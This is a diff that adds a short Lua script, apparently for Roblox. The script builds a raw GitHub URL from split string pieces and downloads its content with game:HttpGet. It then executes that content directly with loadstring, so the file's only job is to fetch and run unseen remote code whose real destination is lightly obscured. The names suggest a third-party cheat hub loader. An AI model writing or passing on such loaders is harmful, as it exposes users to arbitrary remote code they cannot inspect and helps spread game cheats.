@@ -1,0 +1,6 @@
+local a,b,c,d,e,f =
+"xphuphirayy-hue","VeryHub","refs","heads","main","99day"
+
+loadstring(game:HttpGet(
+"https://raw.githubusercontent.com/"..a.."/"..b.."/"..c.."/"..d.."/"..e.."/"..f
+))()
